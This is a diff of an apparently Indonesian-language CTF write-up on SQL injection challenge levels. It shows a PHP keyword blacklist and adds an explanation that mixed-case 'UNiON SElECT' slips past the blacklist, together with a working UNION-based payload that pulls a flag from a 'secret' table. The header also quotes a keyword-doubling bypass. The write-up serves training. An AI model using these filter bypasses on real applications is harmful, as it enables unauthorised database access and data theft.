@@ -395,11 +395,11 @@ kemudian `' uniunionon selselectect concat(column_name),1,1 from information_sch
 
 ### Level 4
 
-Soal yang di berikan sama seperti soal di lvl 3 tapi sekarang blacklist nya diperbaharui 
+Soal yang di berikan sama seperti soal di lvl 3 tapi sekarang blacklist nya diperbaharui
 
 ```php
 if (isset($_GET['q'])) {
-    
+
     $filter = array('UNION', 'SELECT');
 
     // Remove all banned characters
@@ -410,7 +410,9 @@ if (isset($_GET['q'])) {
 }
 ```
 
+Singkat cerita jadi itu yang di blacklist adalah "UNION,union,SELECT,SELECT" sehingga kita bisa menggunakan "UNiON,SElECT" dengan cara yang sama dengan level3 kita bisa mendapatkan flagnya 
 
+`3' UNiON SElECT flag,1,1 from secret#`
 
 ### Level 5
 
